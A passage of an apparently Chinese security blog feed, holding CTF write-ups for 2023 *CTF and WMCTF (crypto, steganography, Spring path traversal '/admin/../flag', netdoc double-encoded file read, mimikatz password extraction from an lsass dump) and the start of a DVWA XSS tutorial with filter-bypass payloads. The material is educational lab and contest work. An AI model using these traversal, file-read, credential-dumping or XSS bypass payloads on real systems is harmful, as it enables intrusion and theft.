aria-hidden="true">img</figcaption></figure><h2 id="misc"><strong>misc</strong></h2><h3 id="snippingtools"><strong>snippingTools</strong></h3><p>CVE-2023-28303</p><p>https://github.com/frankthetank-music/Acropalypse-Multi-Tool</p><figure><img src="/img/2023starCTF/16969546245885.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="old-language"><strong>old language</strong></h3><p>谷歌识图</p><p><ahref="https://zh.fonts2u.com/dovahkiin.字体">https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93</a></p><figure><img src="/img/2023starCTF/16969546245886.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023WMCTF</title>
    <link href="/2023/08/27/2023WMCTF/"/>
    <url>/2023/08/27/2023WMCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="misc"><strong>MISC</strong></h2><h3 id="find-me"><strong>find me</strong></h3><figure><img src="/img/2023WMCTF/170062069180316.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>提示在Reddit发了动态</p><p>通过相关搜索发现帖子 https://www.reddit.com/user/WearyMeadow/</p><figure><img src="/img/2023WMCTF/17006206917691.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>base64解码得到 https://ufile.io/670unszp，下载了一个流量包，里面有几个验证过程，找到密钥：mysecretkey，但不知道加解密实现方法</p><p>在刚刚的图片发现头像是github风格的头像，在github找到几个仓库</p><p>其中有一个是博客https://wearymeadow.icu/，里面有一篇加密的文章，里面是流量包的加解密方法</p><figure><img src="/img/2023WMCTF/17006206917692.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>不知道密码，在仓库中注意到了autoAuth，看到有个密码，密码复用</p><figure><img src="/img/2023WMCTF/17006206917693.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打开博客发现加解密方法</p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message, key</span>):<br>    seed  = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)<br>    random.seed(seed)<br>    encrypted = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    encrypted = cipher.encrypt(pad(encrypted))<br>    <span class="hljs-keyword">return</span> encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># Still working on this...</span><br>    <span class="hljs-keyword">pass</span><br>...<br></code></pre></td></tr></table></figure><p>爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># AES解密</span><br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-comment"># 爆破seed生成相同随机数</span><br>    <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):<br>        random.seed(seed)<br>        res = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>            res += <span class="hljs-built_in">bytes</span>([decrypted[i]^random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;WMCTF&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(res)<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&#x27;</span>)<br>key = pad(<span class="hljs-string">b&#x27;mysecretkey&#x27;</span>) <br>decrypt(ciphertext, key)<br><span class="hljs-comment">#b&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;\xb0.T\x80&amp;\xb5\xb1\x1epGZ)\xbe6\xc8\xcc&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="fantastic-terminal"><strong>Fantastic terminal</strong></h3><p>起一个docker ，<code>docker-compose up -d</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls</span><br>root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cat challenge</span><br></code></pre></td></tr></table></figure><figure><img src="/img/2023WMCTF/17006206917694.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="oversharing"><strong>Oversharing</strong></h3><p>题目容器是ssh，给了流量包里有smb协议，导出smb可以发现有lsass.dmp</p><figure><img src="/img/2023WMCTF/17006206917705.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>mimikatz提出密码</p><figure><img src="/img/2023WMCTF/17006206917706.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到ssh密码，ssh登录cat flag即可</p><h2 id="steg"><strong>Steg</strong></h2><h3 id="ez_v1deo"><strong>EZ_v1deo</strong></h3><p>题目：视频好像被L1near弄坏掉了♂</p><p>当时一直以为是视频缺少了一段或者损坏了，在这个方向上浪费好多时间</p><p>最后用ffmpeg将每一帧提取出来，试了一下lsb，结果发现有隐写</p><p><code>ffmpeg -i flag.avi ./%4d.png</code></p><p>这样提取出210帧，每隔4、5帧有是相同的帧，stegsolve逐个看</p><p>还可以写脚本生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment">#提取最低有效位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_lsb</span>(<span class="hljs-params">frame</span>):<br>    <span class="hljs-keyword">return</span> frame &amp; <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">input_video, output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;XVID&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#循环读帧</span><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#提取最低每一帧最低有效位到新帧，写入</span><br>        lsb_frame = extract_lsb(frame) * (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>        out.write(lsb_frame.astype(np.uint8))<br>        <br>    cap.release()<br>    out.release()<br>    cv2.destroyAllWindows()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    input_video = <span class="hljs-string">&#x27;flag.avi&#x27;</span><br>    output_video = <span class="hljs-string">&#x27;new.avi&#x27;</span><br>    main(input_video, output_video)<br></code></pre></td></tr></table></figure><h3 id="mondy-left-me-broken"><strong>Mondy left me Broken</strong></h3><p>看着wp做的</p><p>首先，猫脸变换</p><figure><img src="/img/2023WMCTF/17006206917707.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对于广义的猫脸变换</p><figure><img src="/img/2023WMCTF/17006206917708.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到其逆变换公式，通过以下脚本爆破出a，b</p><p>得到a=5，b=5，还原视频</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><span class="hljs-comment"># #爆破a,b</span><br><span class="hljs-comment"># im = Image.open(&#x27;final.jpg&#x27;)</span><br><span class="hljs-comment"># im = np.array(im)</span><br><br><span class="hljs-comment"># def dearnold(img):</span><br><span class="hljs-comment">#     r,c,t = img.shape</span><br><span class="hljs-comment">#     p = np.zeros((r,c,t),dtype=np.uint8)</span><br><span class="hljs-comment">#     for a in range(1, 11):</span><br><span class="hljs-comment">#         for b in range(1, 11):</span><br><span class="hljs-comment">#             for i in range(r):</span><br><span class="hljs-comment">#                 for j in range(c):</span><br><span class="hljs-comment">#                     for k in range(t):</span><br><span class="hljs-comment">#                         x = ((a*b+1)*i - b*j)%r</span><br><span class="hljs-comment">#                         y = (-a*i + j)%r</span><br><span class="hljs-comment">#                         p[x,y,k] = img[i,j,k]</span><br><span class="hljs-comment">#             filename = f&#x27;./dearnold&#123;a&#125;_&#123;b&#125;.jpg&#x27;</span><br><span class="hljs-comment">#             cv2.imwrite(filename, p)</span><br><span class="hljs-comment">#             print(&#x27;dearnold&#123;&#125;_&#123;&#125;&#x27;.format(a, b))</span><br><span class="hljs-comment">#     return p</span><br><span class="hljs-comment"># #dearnold(im)</span><br><span class="hljs-comment"># ##直接看图片dearnold5_5为正常图片=&gt;得到a=5, b=5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video_dearnold</span>(<span class="hljs-params">img</span>):<br>    r,c,t = img.shape<br>    p = np.zeros((r,c,t),dtype=np.uint8)<br>    a = <span class="hljs-number">5</span><br>    b = <span class="hljs-number">5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>                x = ((a*b+<span class="hljs-number">1</span>)*i - b*j)%r<br>                y = (-a*i + j)%r<br>                p[x,y,k] = img[i,j,k]<br>    <span class="hljs-keyword">return</span> p<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video</span>(<span class="hljs-params">input_video,output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;mp4v&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> ret:<br>            frame = video_dearnold(frame)``<br>            out.write(frame)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    cap.release()<br>    out.release()<br><br>video(<span class="hljs-string">&#x27;final.mkv&#x27;</span>,<span class="hljs-string">&#x27;new.mp4&#x27;</span>)<br></code></pre></td></tr></table></figure><p>wp说后半段flag在视频中，但是确实看不清</p><p><img src="/img/2023WMCTF/17006206917709.png" alt="img" /><imgsrc="/img/2023WMCTF/170062069177010.png" alt="img" /></p><p>hint直接放出<code>_I_CAN_GOT_both&#125;</code></p><figure><img src="/img/2023WMCTF/170062069177011.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023WMCTF/170062069177012.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>dct水印</p><p>原理可以参考 https://weipp7.gitee.io/posts/e1e00902.html</p><p>我这里找了很久找不到原音频（不知道怎么从bilibili弄原音频https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click），贴个输出频谱图的脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> scipy.io <span class="hljs-keyword">import</span> wavfile<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> dct, idct, fft, fftfreq, ifft<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> matplotlib.mlab <span class="hljs-keyword">import</span> window_none<br>rate, data = wavfile.read(<span class="hljs-string">&#x27;origin.wav&#x27;</span>)<br>rate2, data2 = wavfile.read(<span class="hljs-string">&#x27;final.wav&#x27;</span>)<br>data3 = data2 - data<br><span class="hljs-comment">#输出data3的频谱图</span><br>n_samples = data3.shape[<span class="hljs-number">0</span>]<br>fft_size = <span class="hljs-number">4096</span><br>plt.specgram(data3 , fft_size, rate, window=window_none,noverlap=<span class="hljs-number">10</span>, scale=<span class="hljs-string">&#x27;dB&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h2 id="web"><strong>WEB</strong></h2><h3 id="anyfileread"><strong>AnyFileRead</strong></h3><p>参考：https://zhuanlan.zhihu.com/p/640655127</p><figure><img src="/img/2023WMCTF/170062069177113.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>SpringSecurityConfig：</p><figure><img src="/img/2023WMCTF/170062069177114.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>payload：<code>/admin/../flag</code></p><p>借用别人的图：</p><figure><img src="/img/2023WMCTF/170062069177115.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ez_java_agagin"><strong>ez_java_agagin</strong></h3><p>环境关了没下附件，绕过java和flag字符串，用file/netdoc +url二次编码绕过</p><p>payload：<code>/Imagefile?url1=netdoc://java/..//%25%36%36%25%36%63%25%36%31%25%36%37</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞</title>
    <link href="/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="xss">XSS</h1><p>XSS，跨站脚本，Cross-site scripting。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p><h2 id="漏洞成因">漏洞成因</h2><p>当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。</p><h2 id="类型">类型</h2><p>XSS大致可分为反射、存储、DOM三种类型。</p><ol type="1"><li>反射型：攻击代码在URL里，输出在HTTP响应中</li><li>存储型：攻击代码在数据库里，输出在HTTP响应中</li><li>DOM型：攻击代码在URL里，输出在DOM节点中。</li></ol><h2 id="整体攻击思路">整体攻击思路</h2><p>角色定义：用户、攻击者、正常服务器、恶意服务器</p><ol type="1"><li>攻击者发送带有XSS的恶意URL给用户</li><li>用户点击URL，访问正常服务器</li><li>正常服务器返回了对XSS脚本的响应</li><li>在用户不知情的情况下，用户浏览器执行了返回的XSS脚本，发送会话给恶意服务器</li><li>攻击者从恶意服务器中接受的请求中获取了会话信息(Cookie等)</li><li>攻击者使用用户的身份，登录到正常服务器，相当于劫持了用户会话</li></ol><figure><img src="/img/XSS漏洞/16998361139181.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="dvwa靶场xss练习">DVWA靶场xss练习</h2><h3 id="反射型">反射型</h3><h4 id="low">low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有任何过滤</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium">medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;</code>过滤1次。</p><p>payload：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high">high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>匹配<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code>字符</p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code><code>&lt;iframe onload=alert(1)&gt;</code></p><h4 id="impossible">impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars()</code>转义特殊字符（默认不转义<code>'</code>，但是这里是转义的了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&amp;----&amp;amp;<br>&quot;-----&amp;quot;<br>&#x27;------&amp;apos;<br>&lt;-----&amp;lt<br>&gt;-----&amp;gt;<br></code></pre></td></tr></table></figure><p>转义后无法解析为html元素，无法xss</p><h3 id="存储型">存储型</h3><p>存储型跟反射型的利用基本一致。但是存储型的XSS会存在数据库，弹窗会一直存在</p><h4 id="low-1">low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 